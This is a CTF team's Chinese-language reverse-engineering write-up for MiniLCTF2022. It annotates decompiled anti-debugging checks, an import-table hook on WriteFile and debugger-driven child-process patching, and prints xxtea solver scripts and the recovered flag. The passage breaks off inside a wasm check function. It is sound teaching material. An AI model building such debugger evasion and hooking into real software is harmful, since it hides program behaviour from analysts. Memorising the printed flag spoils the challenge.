**MiniLCTF2022**

**Team**: Flowey

**Final Rank**: 2nd

**Members**: Hana \ hzlg \ hahaha \ limiter

**ITEMS**: Misc \ Reverse \ Web \ Pwn

**Start Time**: 2022.4.30 21:00:00

**End Time**: 2022.5.7 21:00:00

---

# twin | hzlg | done

main 函数里是个 fake flag:

```python
v5 = [38, 17, 8, 35, 26, 8, 28, 39, 3, 25, 26, 43, 10, 29, 4, 30,
      8, 49, 25, 4, 2, 25, 54, 1, 20, 57, 4, 59, 5, 3, 10, 5, 0, 0x38, 0x31, 0x3D, 0x3C, 0x7B, 0x78, 0x79]

for i in range(40):
    print(chr(i ^ v5[i] ^ 0x7F), end="")
# You_are_too_young_this_is_a_fake_flag!!!
```

在 main 函数下断点调试发现在 main 函数之前就有东西执行了

在函数表里找了些可疑函数下断点再交叉引用,发现`TlsCallback_0`为关键函数 

> TLS 回调函数 : 每当创建/终止进程的线程时会自动调用执行的函数（前后共调用两次）

## TLS0 前半部分 增加回调函数

tls0 首尾有两处花指令,还有个 welcome,直接 nop 掉

再把参数类型修一下:

```c
void __cdecl TlsCallback_0(PVOID DLLHandle, ulong Reason)
{
  char *v2; // eax
  char Buffer[80]; // [esp+10h] [ebp-11Ch] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+60h] [ebp-CCh] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+A4h] [ebp-88h] BYREF
  char v7[22]; // [esp+B8h] [ebp-74h] BYREF
  char v8[4]; // [esp+CEh] [ebp-5Eh] BYREF
  char v9[44]; // [esp+D4h] [ebp-58h] BYREF
  char v10[12]; // [esp+100h] [ebp-2Ch] BYREF
  CHAR Name[8]; // [esp+10Ch] [ebp-20h] BYREF
  CHAR ApplicationName[8]; // [esp+114h] [ebp-18h] BYREF
  char v13[8]; // [esp+11Ch] [ebp-10h] BYREF
  char Format[7]; // [esp+124h] [ebp-8h] BYREF
  uint8_t v15; // [esp+12Bh] [ebp-1h]

  if ( Reason == 1 )
  {
    memset(Buffer, 0, sizeof(Buffer));
    WriteConsole_func(Buffer);
    v15 = 0;
    v15 = NtCurrentPeb()->BeingDebugged;
    if ( v15 )
      *(&TlsCallbacks + 1) = (int (__cdecl *)(int, int))sub_401D60;
    strcpy(Name, "93>8");
    xor_0x7F_decode(Name);
    hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, Name);
    *(_DWORD *)dword_404448 = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u);
    v7[0] = 47;                                 // Please input your flag:
    v7[1] = 19;
    v7[2] = 26;
    v7[3] = 30;
    v7[4] = 12;
    v7[5] = 26;
    v7[6] = 95;
    v7[7] = 22;
    v7[8] = 17;
    v7[9] = 15;
    v7[10] = 10;
    v7[11] = 11;
    v7[12] = 95;
    v7[13] = 6;
    v7[14] = 16;
    v7[15] = 10;
    v7[16] = 13;
    v7[17] = 95;
    v7[18] = 25;
    v7[19] = 19;
    v7[20] = 30;
    v7[21] = 24;
    strcpy(v8, "E_");
    v2 = (char *)xor_0x7F_decode(v7);
    WriteConsole_func(v2);
    Format[0] = 90;                             // %s
    Format[1] = 12;
    Format[2] = 0;
    xor_0x7F_decode(Format);
    scanf_func(Format, *(_DWORD *)dword_404448, 41);
  }
    if ( !Reason )
	.
    .
    .
    Reason 不为 1 的情况在后面
    .
    .
    .
}
```



创建线程时 Reason = 1, 执行 tls0 的前半部分

```c
v15 = 0;
v15 = NtCurrentPeb()->BeingDebugged;
if ( v15 )
  *(&TlsCallbacks + 1) = (int (__cdecl *)(int, int))sub_401D60;
```

↑ 此处会判断是否有调试器  `BeingDebugged; // 无调试器时 = 0，有调试器时 = 1 `

若没有调试器就在 tls0 后增加一个函数`sub_401D60`

动调时想要绕过 if 判断只需将 jnz patch 为 jz 即可

## 回调函数 修改 WriteFile 函数的索引

新增的函数`sub_401D60`里面也有一个花,nop 掉 :

```c
void __cdecl __noreturn sub_401D60(int a1, int a2)
{
  CHAR ModuleName[16]; // [esp+0h] [ebp-1Ch] BYREF
  CHAR ProcName[12]; // [esp+10h] [ebp-Ch] BYREF

  if ( a2 == 1 )
  {
    ProcName[0] = 40;
    ProcName[1] = 13;
    ProcName[2] = 22;
    ProcName[3] = 11;
    ProcName[4] = 26;
    ProcName[5] = 57;
    ProcName[6] = 22;
    ProcName[7] = 19;
    ProcName[8] = 26;
    ProcName[9] = 0;
    ModuleName[0] = 20;
    ModuleName[1] = 26;
    ModuleName[2] = 13;
    ModuleName[3] = 17;
    ModuleName[4] = 26;
    ModuleName[5] = 19;
    ModuleName[6] = 76;
    ModuleName[7] = 77;
    ModuleName[8] = 81;
    ModuleName[9] = 27;
    ModuleName[10] = 19;
    ModuleName[11] = 19;
    ModuleName[12] = 0;
    xor_0x7F_decode(ProcName);                  // WriteFile
    xor_0x7F_decode(ModuleName);                // kernel32.dll
    hModule = GetModuleHandleA(ModuleName);     // 获得句柄
    funcptr_writefile = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))GetProcAddress(hModule, ProcName);// 获得函数指针
    replace_func((int)funcptr_writefile, (int)sub_401650, hModule);// 调用 WriteFile 函数时会索引到 sub_401650
  }
  ExitProcess(0xFFFFFFFF);
}
```



`sub_4016C0(replace_func)`遍历 kernel32 的导入表,在 lpaddress 为 WriteFile 时调用 VituralProtect 修改权限,用`sub_401650`替换 WriteFile 的索引

```c
int __cdecl replace_func(int a1, int a2, HMODULE a3)
{
  DWORD flOldProtect; // [esp+Ch] [ebp-10h] BYREF
  int ptr_to_IMPORT_DESCRIPTOR_KERNEL32; // [esp+10h] [ebp-Ch]
  HMODULE v6; // [esp+14h] [ebp-8h]
  LPVOID lpAddress; // [esp+18h] [ebp-4h]

  v6 = GetModuleHandleA(0);
  ptr_to_IMPORT_DESCRIPTOR_KERNEL32 = (int)v6 + *(_DWORD *)((char *)v6 + *((_DWORD *)v6 + 15) + 128);// KERNEL32 的导入表
  flOldProtect = 0;
  do
  {
    if ( !*(_DWORD *)(ptr_to_IMPORT_DESCRIPTOR_KERNEL32 + 16) || dword_4043D0 )
      break;
    if ( a3 == GetModuleHandleA((LPCSTR)v6 + *(_DWORD *)(ptr_to_IMPORT_DESCRIPTOR_KERNEL32 + 12)) )
    {
      for ( lpAddress = (char *)v6 + *(_DWORD *)(ptr_to_IMPORT_DESCRIPTOR_KERNEL32 + 16);
            lpAddress;
            lpAddress = (char *)lpAddress + 4 )
      {
        if ( *(_DWORD *)lpAddress == a1 )
        {
          VirtualProtect(lpAddress, 4u, 4u, &flOldProtect);
          *(_DWORD *)lpAddress = a2;
          VirtualProtect(lpAddress, 4u, flOldProtect, 0);
          dword_4043D0 = 1;
          break;
        }
      }
    }
    ptr_to_IMPORT_DESCRIPTOR_KERNEL32 += 20;
  }
  while ( !dword_4043D0 );
  return dword_4043D0;
}
```

## 用来顶替的函数

替代 writefile 的函数`sub_401650`:

```c
int __stdcall sub_401650(int a1, int a2, int a3, int a4, int a5)
{
  *(_BYTE *)(a2 + 1822) = 6;
  *(_BYTE *)(a2 + 1713) = 6;
  funcptr_writefile(a1, a2, a3, a4, a5);
  another_replace_func(funcptr_writefile, sub_401650, hModule);
  return 0;
}
```

调用 WriteFile 时会在缓冲区里写了两个 6 然后调用真正的 WriteFile



## TLS0 后半部分 1 子进程运行 tmp 文件

新增函数替换完后执行 ExitProcess,终止线程的时候又会调用 TLS0,主线程结束时 Reason 为 0 ,执行 TLS0 的下半部分

```c
if ( !Reason )
  {
    ApplicationName[0] = 81;
    ApplicationName[1] = 80;
    ApplicationName[2] = 11;
    ApplicationName[3] = 18;
    ApplicationName[4] = 15;
    ApplicationName[5] = 0;
    xor_0x7F_decode(ApplicationName);           // ./tmp
    new_file_tmp();
    memset(&StartupInfo, 0, sizeof(StartupInfo));
    StartupInfo.cb = 68;
    CreateProcessA(ApplicationName, 0, 0, 0, 0, 3u, 0, 0, &StartupInfo, &ProcessInformation);
    v10[0] = 28;                                // correct
    v10[1] = 16;
    v10[2] = 13;
    v10[3] = 13;
    v10[4] = 26;
    v10[5] = 28;
    v10[6] = 11;
    v10[7] = 117;
    v10[8] = 0;
    v13[0] = 8;                                 // wrong
    v13[1] = 13;
    v13[2] = 16;
    v13[3] = 17;
    v13[4] = 24;
    v13[5] = 117;
    v13[6] = 0;
    v9[0] = 47;                                 // Please close the debugger and try again
    v9[1] = 19;
    v9[2] = 26;
    v9[3] = 30;
    v9[4] = 12;
    v9[5] = 26;
    v9[6] = 95;
    v9[7] = 28;
    v9[8] = 19;
    v9[9] = 16;
    v9[10] = 12;
    v9[11] = 26;
    v9[12] = 95;
    v9[13] = 11;
    v9[14] = 23;
    v9[15] = 26;
    v9[16] = 95;
    v9[17] = 27;
    v9[18] = 26;
    v9[19] = 29;
    v9[20] = 10;
    v9[21] = 24;
    v9[22] = 24;
    v9[23] = 26;
    v9[24] = 13;
    v9[25] = 95;
    v9[26] = 30;
    v9[27] = 17;
    v9[28] = 27;
    v9[29] = 95;
    v9[30] = 11;
    v9[31] = 13;
    v9[32] = 6;
    v9[33] = 95;
    v9[34] = 30;
    v9[35] = 24;
    v9[36] = 30;
    v9[37] = 22;
    v9[38] = 17;
    v9[39] = 117;
    v9[40] = 0;
    sub_401510(ApplicationName, &ProcessInformation);		
    .
    .
    .
  }
```



`sub_401410(new_file_tmp)` 创建了一个名为 tmp 的文件,调用 WriteFile 时索引到了`sub_401650`,将一个 xxtea 算法中的一个右移量修改为 6 再写入 tmp 文件(动调跟数据然后按 c 生成代码就知道改了啥)

```c
BOOL new_file_tmp()
{
  CHAR Type[8]; // [esp+0h] [ebp-2Ch] BYREF
  CHAR FileName[8]; // [esp+8h] [ebp-24h] BYREF
  BOOL v3; // [esp+10h] [ebp-1Ch]
  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-18h] BYREF
  HGLOBAL hResData; // [esp+18h] [ebp-14h]
  LPCVOID lpBuffer; // [esp+1Ch] [ebp-10h]
  DWORD nNumberOfBytesToWrite; // [esp+20h] [ebp-Ch]
  HRSRC hResInfo; // [esp+24h] [ebp-8h]
  HANDLE hFile; // [esp+28h] [ebp-4h]

  FileName[0] = 81;
  FileName[1] = 80;
  FileName[2] = 11;
  FileName[3] = 18;
  FileName[4] = 15;
  FileName[5] = 0;
  strcpy(Type, ":':-:,");
  xor_0x7F_decode(FileName);                    // ./tmp
  xor_0x7F_decode(Type);                        // EXERES
  hResInfo = FindResourceA(0, (LPCSTR)0x65, Type);
  nNumberOfBytesToWrite = SizeofResource(0, hResInfo);
  hResData = LoadResource(0, hResInfo);
  lpBuffer = LockResource(hResData);
  sub_401E40(lpBuffer, nNumberOfBytesToWrite);
  hFile = CreateFileA(FileName, 0xC0000000, 0, 0, 2u, 0x80u, 0);
  NumberOfBytesWritten = 0;
  v3 = WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
  FlushFileBuffers(hFile);
  return CloseHandle(hFile);
} 
```

创建 tmp 文件后创建新进程运行 tmp 文件

## TLS0 后半部分 2 监视 tmp 文件

有一个花,去掉

```c
BOOL __cdecl sub_401510(LPCSTR lpFileName, int ProcessInformation)
{
  CONTEXT Context; // [esp+8h] [ebp-33Ch] BYREF
  int v4[23]; // [esp+2D4h] [ebp-70h] BYREF
  HANDLE hThread; // [esp+330h] [ebp-14h]
  int ProcessId; // [esp+334h] [ebp-10h]
  int ThreadId; // [esp+338h] [ebp-Ch]
  int v8; // [esp+33Ch] [ebp-8h]
  int v9; // [esp+340h] [ebp-4h]

  v4[22] = *(_DWORD *)ProcessInformation;
  hThread = *(HANDLE *)(ProcessInformation + 4);
  ProcessId = *(_DWORD *)(ProcessInformation + 8);
  ThreadId = *(_DWORD *)(ProcessInformation + 12);
  v9 = 1;
  while ( v9 )
  {
    WaitForDebugEvent(&DebugEvent, 0xFFFFFFFF);
    if ( DebugEvent.dwDebugEventCode == 1 )     // code 为 1 时接受处理来自子进程的异常，进而修改子进程代码
    {
      qmemcpy(v4, &DebugEvent.u, 0x54u);
      v8 = v4[0];
      if ( v4[0] == EXCEPTION_ACCESS_VIOLATION )
      {
        memset(&Context, 0, sizeof(Context));
        Context.ContextFlags = 65543;
        GetThreadContext(hThread, &Context);
        Context.Eip += 5;
        Context.Eax ^= 0x1B207u;
        SetThreadContext(hThread, &Context);
      }
    }
    if ( DebugEvent.dwDebugEventCode == 5 )
    {
      dword_404440 = DebugEvent.u.Exception.ExceptionRecord.ExceptionCode;
      v9 = 0;
    }
    ContinueDebugEvent(DebugEvent.dwProcessId, DebugEvent.dwThreadId, 0x10002u);
  }
  Sleep(0x64u);
  return DeleteFileA(lpFileName);
}
```

根据`DebugEvent.dwDebugEventCode`进行了分支

它表明了是什么事件被 WaitForDebugEvent() 捕捉到了。同时也决定了，在联合(union )u 里存储的是什么类型 的值。u 里的变量由 dwDebugEventCode 决定，一一对应如下：

| Event Code | Event Code Value           | Union u Value       |
| ---------- | -------------------------- | ------------------- |
| 0x1        | EXCEPTION_DEBUG_EVENT      | u.Exception         |
| 0x2        | CREATE_THREAD_DEBUG_EVENT  | u.CreateThread      |
| 0x3        | CREATE_PROCESS_DEBUG_EVENT | u.CreateProcessInfo |
| 0x4        | EXIT_THREAD_DEBUG_EVENT    | u.ExitThread        |
| 0x5        | EXIT_PROCESS_DEBUG_EVENT   | u.ExitProcess       |
| 0x6        | LOAD_DLL_DEBUG_EVENT       | u.LoadDll           |
| 0x7        | UNLOAD_DLL_DEBUG_EVENT     | u.UnloadDll         |
| 0x8        | OUPUT_DEBUG_STRING_EVENT   | u.DebugString       |
| 0x9        | RIP_EVENT                  | u.RipInfo           |



若子进程发生了异常,则 code 为 1,接受处理来自子进程的异常，进而修改子进程代码。此处`若子进程发生内存访问错误则 eip+5 并修改 eax`

若子进程正常退出,则 code 为 5。此处保存 ExceptionCode

## tmp 文件 魔改 xxtea 并校验

tmp 文件里的 main 函数有很多反调试,并且对 delta 和 key 进行了修改

`sub_401400`里对**delta ^= 0x12345678**,并调用`AddVectoredExceptionHandler`注册了内存访问错误下的VEH异常处理函数(应该没被用到?被主进程的异常处理给抢了?)

`sub_4010E0`判断是否在调试,未在调试则**delta ^= 0x90909090 , key[1] = 0x90**

`sub_401210`里**delta = (delta ^ 0x7B) + 12345**,然后引起内存访问异常,被刚刚的主进程接收,进行异常处理,eip+5,**eax(delta) ^= 0x1B207**



`sub_401390`打开映像文件,取 40 个字符,应该是输入的 flag

`sub_401240`观察发现是 xxtea(看 delta 值等) 

MX 右移量在前面改为了 6,delta 和 key 也被修改了,不是标准的 xxtea:

```python
from ctypes import *


def MX(z, y, total, key, p, e):
    temp1 = (z.value >> 6 ^ y.value << 2) + (y.value >> 3 ^ z.value << 4)
    temp2 = (total.value ^ y.value) + (key[(p & 3) ^ e.value] ^ z.value)
    return c_uint32(temp1 ^ temp2)


def decrypt(n, v, key):
    delta = ((((0x9E3779B9 ^ 0x12345678) ^ 0x90909090) ^ 0x7B) + 12345) ^ 0x1B207
    rounds = 6 + 52//n
    total = c_uint32(rounds * delta)
    y = c_uint32(v[0])
    e = c_uint32(0)

    while rounds > 0:
        e.value = (total.value >> 2) & 3
        for p in range(n-1, 0, -1):
            z = c_uint32(v[p-1])
            v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value
            y.value = v[p]
        z = c_uint32(v[n-1])
        v[0] = c_uint32(v[0] - MX(z, y, total, key, 0, e).value).value
        y.value = v[0]
        total.value -= delta
        rounds -= 1

    return v

v = [0x6B7CE328, 0x4841D5DD, 0x963784DC, 0xEF8A3226, 0x0776B226]
k = [0x12, 0x90, 0x56, 0x78]
n = len(v)

res = decrypt(n, v, k)
for i in range(n):
    print(hex(res[i]))
for i in range(len(v)):
    for j in range(8, 0, -2):
        print(chr(int(str(hex(res[i]))[j:j+2], 16)), end="")
# miniLctf{cbda59ff59e
```

## TLS0 后半部分 3 普通 xxtea 并校验

`sub_4012C0`是 xxtea(看 delta 值等)

```python
from ctypes import *


def MX(z, y, total, key, p, e):
    temp1 = (z.value >> 5 ^ y.value << 2) + (y.value >> 3 ^ z.value << 4)
    temp2 = (total.value ^ y.value) + (key[(p & 3) ^ e.value] ^ z.value)

    return c_uint32(temp1 ^ temp2)


def encrypt(n, v, key):
    delta = 0x9e3779b9
    rounds = 6 + 52//n

    total = c_uint32(0)
    z = c_uint32(v[n-1])
    e = c_uint32(0)

    while rounds > 0:
        total.value += delta
        e.value = (total.value >> 2) & 3
        for p in range(n-1):
            y = c_uint32(v[p+1])
            v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value
            z.value = v[p]
        y = c_uint32(v[0])
        v[n-1] = c_uint32(v[n-1] + MX(z, y, total, key, n-1, e).value).value
        z.value = v[n-1]
        rounds -= 1
    return v


def decrypt(n, v, key):
    delta = 0x9e3779b9
    rounds = 6 + 52//n

    total = c_uint32(rounds * delta)
    y = c_uint32(v[0])
    e = c_uint32(0)

    while rounds > 0:
        e.value = (total.value >> 2) & 3
        for p in range(n-1, 0, -1):
            z = c_uint32(v[p-1])
            v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value
            y.value = v[p]
        z = c_uint32(v[n-1])
        v[0] = c_uint32(v[0] - MX(z, y, total, key, 0, e).value).value
        y.value = v[0]
        total.value -= delta
        rounds -= 1
    return v


v = [0x9021A921, 0xF53B3060, 0x8E88A84E, 0x43635AD5, 0xAC119239]
k = [0x12, 0x34, 0x56, 0x78]
n = len(v)

res = decrypt(n, v, k)
for i in range(n):
    print(hex(res[i]))

for i in range(len(v)):
    for j in range(8, 0, -2):
        print(chr(int(str(hex(res[i]))[j:j+2], 16)), end="")
# 3e90c91c02e9b40b78b}
```

```
miniLctf{cbda59ff59e3e90c91c02e9b40b78b}
```



# WhatAssembly | hzlg | done

wasm 逆向

先 f12 把 wasm 文件和 js 文件 dump 下来

[wabt - github](https://github.com/WebAssembly/wabt)提供了多种格式的转换，其中 wasm2c（在github-realease里）较为常用，将 wasm 文件转化为 C 源码和标头，在 gcc 编译（所需头文件在 github-code 里）使用方法如下。

```c
wasm2c.exe -v xxx.wasm -o test.c //-v 是多次使用使得分析更准确 -o 是输出文件 会生成 test.c 和 test.h
gcc -c -m32 test.c -o test //无链接进行编译 需要 wasm-rt.h 和 wasm-rt-impl.h 头文件
```



首先观察 init 模块，记住重要的地址和偏移

```c
int init()
{
  init_func_types();
  init_globals(); //初始化全局数据
  init_memory();  //内存
  init_table(); // 引入的函数 fxx f 开头
  return init_exports(); //导出函数
}
```



`init_memory`

```c
int init_memory()
{
  wasm_rt_allocate_memory(&w2c_memory, 256, 256);
  load_data((void *)(w2c_memory + 1024), "0123456789abcdefunsigned short", 0x92Cu);
  load_data((void *)(w2c_memory + 3372), &data_segment_data_1, 4u);
  return load_data((void *)(w2c_memory + 3376), &data_segment_data_2, 0);
}
```

可见在 memory 的**1024,3372和3376**处 copy 了三处数据块。



wasm 文件中函数有点多,观察 js 文件能找到关键函数

```
// in html
enc = '05779c24d9249e693fa7ac4a10c68dfbd3520083b33f56e90fd84978b6a15c970b976779a8fefe91fb87d2221c9a1f87ed7eaddb8ae6370f9de69e3a7a5c5c488cde79756b0b9f1713e749edd41cff04'
table = '0123456789abcdef'
key = 'D33.B4T0'
```

```js
// in js
function setupTag() {
  let convertToCArray = (s) => { let ptr = Module.allocate(Module.intArrayFromString(s), Module.ALLOC_STACK); return ptr; };
  let flag = document.getElementById("miniL");
  let enc = flag.getAttribute("enc").trim();
  let key = flag.getAttribute("key").trim();
  if (enc && key) {
    let button = document.getElementById("check");
    button.onclick = (event) => {
      let stack = Module.stackSave();
      flag_arr = convertToCArray(flag.value);
      enc_arr = convertToCArray(enc);
      key_arr = convertToCArray(key);
      if (Module._check(flag_arr, key_arr, enc_arr)) { eval(flag.getAttribute("onerror")); }
      else { eval(flag.getAttribute("onsuccess")); }
      Module.stackRestore(stack);
    };
  }
}
```

可以看到,button.onclick 时把 flag,key 和 enc 作为参数`调用了 check 模块`

## check 函数:

从 memory 中读了 16 位数据 (table)

参数入栈

取 key,拼接 每 8 字节的 flag

42 轮加密

enc 每 32 字节数据的第 0,2,4,6...30 字节数据

key+flag 的前 16 位数据 /16 作为索引,取 table 中的值

二者比较

enc每32字节数据的第 1,3,5,7...31 字节数据

key+flag 的前 16 位数据 %16 作为索引,取 table 中的值

二者比较

```c
int __cdecl w2c_check(int a1, int a2, int a3)
{
  int v3; // eax
  int result; // eax
  int v5; // [esp+34h] [ebp-484h]
  __int64 v6; // [esp+38h] [ebp-480h]
  int v7; // [esp+48h] [ebp-470h]
  int v8; // [esp+48h] [ebp-470h]
  int v9; // [esp+48h] [ebp-470h]
  int v10; // [esp+48h] [ebp-470h]
  int v11; // [esp+48h] [ebp-470h]
  int v12; // [esp+48h] [ebp-470h]
  int v13; // [esp+4Ch] [ebp-46Ch]
  __int64 v14; // [esp+58h] [ebp-460h]
  int v15; // [esp+70h] [ebp-448h]
  int v16; // [esp+8Ch] [ebp-42Ch]
  char v17; // [esp+B4h] [ebp-404h]
  int v18; // [esp+DCh] [ebp-3DCh]
  char v19; // [esp+FCh] [ebp-3BCh]
  int v20; // [esp+10Ch] [ebp-3ACh]
  int v21; // [esp+11Ch] [ebp-39Ch]
  int v22; // [esp+128h] [ebp-390h]
  int v23; // [esp+12Ch] [ebp-38Ch]
  char v24; // [esp+154h] [ebp-364h]
  int v25; // [esp+17Ch] [ebp-33Ch]
  char v26; // [esp+19Ch] [ebp-31Ch]
  int v27; // [esp+1A0h] [ebp-318h]
  int v28; // [esp+1BCh] [ebp-2FCh]
  int v29; // [esp+1C8h] [ebp-2F0h]
  int v30; // [esp+304h] [ebp-1B4h]
  unsigned __int8 v31; // [esp+320h] [ebp-198h]
  int v32; // [esp+324h] [ebp-194h]
  int v33; // [esp+330h] [ebp-188h]
  int v34; // [esp+334h] [ebp-184h]
  int v35; // [esp+368h] [ebp-150h]
  int v36; // [esp+388h] [ebp-130h]
  unsigned __int8 v37; // [esp+39Ch] [ebp-11Ch]
  int v38; // [esp+3A0h] [ebp-118h]
  int v39; // [esp+3A8h] [ebp-110h]
  int v40; // [esp+3D0h] [ebp-E8h]
  int v41; // [esp+3D4h] [ebp-E4h]
  int v42; // [esp+3DCh] [ebp-DCh]
  int v43; // [esp+3E0h] [ebp-D8h]
  int v44; // [esp+3E4h] [ebp-D4h]
  int v45; // [esp+3E8h] [ebp-D0h]
  int v46; // [esp+3ECh] [ebp-CCh]
  int v47; // [esp+414h] [ebp-A4h]
  int v48; // [esp+438h] [ebp-80h]
  int v49; // [esp+474h] [ebp-44h]
  int v50; // [esp+478h] [ebp-40h]
  int v51; // [esp+47Ch] [ebp-3Ch]
  int v52; // [esp+480h] [ebp-38h]
  int v53; // [esp+484h] [ebp-34h]
  int v54; // [esp+488h] [ebp-30h]
  int v55; // [esp+4A4h] [ebp-14h]

  if ( ++wasm_rt_call_stack_depth > 0x1F4u )
    wasm_rt_trap(7);
  stack_ptr -= 112;                             // 开栈
  v55 = stack_ptr;
  i32_store(&memory, (unsigned int)stack_ptr + 104LL, a1);// 参数 a1,a2,a3 入栈
  i32_store(&memory, (unsigned int)v55 + 100LL, a2);
  i32_store(&memory, (unsigned int)v55 + 96LL, a3);
  v14 = i64_load(&memory, 1032LL);
  i64_store(&memory, (unsigned int)(v55 + 88), v14, SHIDWORD(v14));// 从 mem+1032 处读 8 字节,存到 esp+88
  v6 = i64_load(&memory, 1024LL);
  i64_store(&memory, (unsigned int)(v55 + 80), v6, SHIDWORD(v6));// 从 mem+1024 处读 8 字节,存到 esp+80
  v54 = i32_load(&memory, (unsigned int)v55 + 104LL);
  v53 = w2c_strlen(v54);
  i32_store(&memory, (unsigned int)v55 + 76LL, v53);// esp+76 存 a1 长度
  v52 = i32_load(&memory, (unsigned int)v55 + 100LL);
  v51 = w2c_strlen(v52);
  i32_store(&memory, (unsigned int)v55 + 72LL, v51);// esp+72 存 a2 长度
  v50 = i32_load(&memory, (unsigned int)v55 + 96LL);
  v49 = w2c_strlen(v50);
  i32_store(&memory, (unsigned int)v55 + 68LL, v49);// esp+68 存 a3 长度
  if ( i32_load(&memory, (unsigned int)v55 + 72LL) >= 8
    && (v48 = 4 * i32_load(&memory, (unsigned int)v55 + 76LL), v48 > i32_load(&memory, (unsigned int)v55 + 68LL) - 32)
    && (v47 = 4 * i32_load(&memory, (unsigned int)v55 + 76LL), v47 <= i32_load(&memory, (unsigned int)v55 + 68LL)) )
  {                                             // len(a2)>8,4len(a1)>len(a3)-32,4len(a1)≤len(a3)
                                                // 否则return = -1
    v46 = (i32_load(&memory, (unsigned int)v55 + 76LL) + 15) & 0xFFFFFFF0;
    i32_store(&memory, (unsigned int)v55 + 64LL, v46);
    v45 = i32_load(&memory, (unsigned int)v55 + 64LL);
    v44 = w2c_dlmalloc(v45);                    // 为 a1 开空间,长度为 16 的倍数,栈对齐吧
    i32_store(&memory, (unsigned int)v55 + 60LL, v44);
    v43 = i32_load(&memory, (unsigned int)v55 + 60LL);
    v42 = i32_load(&memory, (unsigned int)v55 + 64LL);
    w2c_memset(v43, 0, v42);                    // 空间清零
    v41 = i32_load(&memory, (unsigned int)v55 + 60LL);
    v40 = i32_load(&memory, (unsigned int)v55 + 104LL);
    v5 = i32_load(&memory, (unsigned int)v55 + 76LL);
    w2c___memcpy(v41, v40, v5);                 // 移入 a1
    i32_store(&memory, (unsigned int)v55 + 28LL, 0);// i=0
    while ( i32_load(&memory, (unsigned int)v55 + 28LL) < 8 )// i<8
    {
      v39 = i32_load(&memory, (unsigned int)v55 + 100LL);
      v38 = i32_load(&memory, (unsigned int)v55 + 28LL) + v39;// a2+i
      v37 = i32_load8_u(&memory, v38, 0);
      v36 = i32_load(&memory, (unsigned int)v55 + 28LL) + v55 + 32;// esp+32+i
      i32_store8(&memory, (unsigned int)v36, v37);
      v7 = i32_load(&memory, (unsigned int)v55 + 28LL) + 1;// i++
      i32_store(&memory, (unsigned int)v55 + 28LL, v7);
    }                                           // esp+32 开始存 a2 前 8 位
    i32_store(&memory, (unsigned int)v55 + 24LL, 0);
    i32_store(&memory, (unsigned int)v55 + 20LL, 0);
    while ( 1 )
    {
      v35 = i32_load(&memory, (unsigned int)v55 + 20LL);// i=0
      if ( v35 >= i32_load(&memory, (unsigned int)v55 + 76LL) )// i>len(a1)->break
        break;
      i32_store(&memory, (unsigned int)v55 + 16LL, 0);// j=0
      while ( i32_load(&memory, (unsigned int)v55 + 16LL) < 8 )// j<8
      {
        v34 = i32_load(&memory, (unsigned int)v55 + 60LL);// a1
        v33 = i32_load(&memory, (unsigned int)v55 + 20LL);
        v32 = i32_load(&memory, (unsigned int)v55 + 16LL) + v33 + v34;// a1+i+j
        v31 = i32_load8_u(&memory, v32, 0);
        v30 = i32_load(&memory, (unsigned int)v55 + 16LL) + 8 + v55 + 32;// a2+j+8
        i32_store8(&memory, (unsigned int)v30, v31);// 把 a1 每八位存到 a2 前八位的后面
        v8 = i32_load(&memory, (unsigned int)v55 + 16LL) + 1;// j++
        i32_store(&memory, (unsigned int)v55 + 16LL, v8);
      }
      i32_store(&memory, (unsigned int)v55 + 12LL, 0);// loop=0
      while ( i32_load(&memory, (unsigned int)v55 + 12LL) < 42 )// loop<42
      {
        w2c_qua_rou(v55 + 32, 12, 8, 4, 0);
        w2c_qua_rou(v55 + 32, 13, 9, 5, 1);
        w2c_qua_rou(v55 + 32, 14, 10, 6, 2);
        w2c_qua_rou(v55 + 32, 15, 11, 7, 3);
        w2c_qua_rou(v55 + 32, 15, 10, 5, 0);
        w2c_qua_rou(v55 + 32, 12, 11, 6, 1);
        w2c_qua_rou(v55 + 32, 13, 8, 7, 2);
        w2c_qua_rou(v55 + 32, 14, 9, 4, 3);
        v9 = i32_load(&memory, (unsigned int)v55 + 12LL) + 1;// loop++
        i32_store(&memory, (unsigned int)v55 + 12LL, v9);
      }
      i32_store(&memory, (unsigned int)v55 + 8LL, 0);
      while ( i32_load(&memory, (unsigned int)v55 + 8LL) < 16 )// k<16
      {
        v29 = i32_load(&memory, (unsigned int)v55 + 96LL);
        v28 = 4 * i32_load(&memory, (unsigned int)v55 + 20LL);// 4i
        v27 = 2 * i32_load(&memory, (unsigned int)v55 + 8LL) + v28 + v29;// (a3+4*i+2*k)
        v26 = i32_load8_u(&memory, v27, 0);
        v25 = i32_load(&memory, (unsigned int)v55 + 8LL) + v55 + 32;
        v13 = (unsigned __int8)i32_load8_u(&memory, v25, 0);// a2+k
        v24 = i32_load8_u(&memory, v13 / 16 + v55 + 80, 0);// data0+(a2+k)/16
        v23 = (v26 != v24) | i32_load(&memory, (unsigned int)v55 + 24LL);// (a3+4*i+2*k) ≠ data0+(a2+k)/16) | flag
        i32_store(&memory, (unsigned int)v55 + 24LL, v23);
        v22 = i32_load(&memory, (unsigned int)v55 + 96LL);// a3
        v21 = 4 * i32_load(&memory, (unsigned int)v55 + 20LL);// 4i
        v20 = 2 * i32_load(&memory, (unsigned int)v55 + 8LL) + v21;// (4i+2k)
        v19 = i32_load8_u(&memory, v20 + 1 + v22, 0);// a3+4i+2k+1
        v18 = i32_load(&memory, (unsigned int)v55 + 8LL) + v55 + 32;// a2+k
        v3 = (unsigned __int8)i32_load8_u(&memory, v18, 0) % 16;// (a2+k)%16
        v17 = i32_load8_u(&memory, v3 + v55 + 80, 0);// data0+(a2+k)%16
        v16 = (v19 != v17) | i32_load(&memory, (unsigned int)v55 + 24LL);// (a3+4i+2k+1) ≠ data+(a2+k)%16) | flag
        i32_store(&memory, (unsigned int)v55 + 24LL, v16);
        v10 = i32_load(&memory, (unsigned int)v55 + 8LL) + 1;// k++
        i32_store(&memory, (unsigned int)v55 + 8LL, v10);
      }
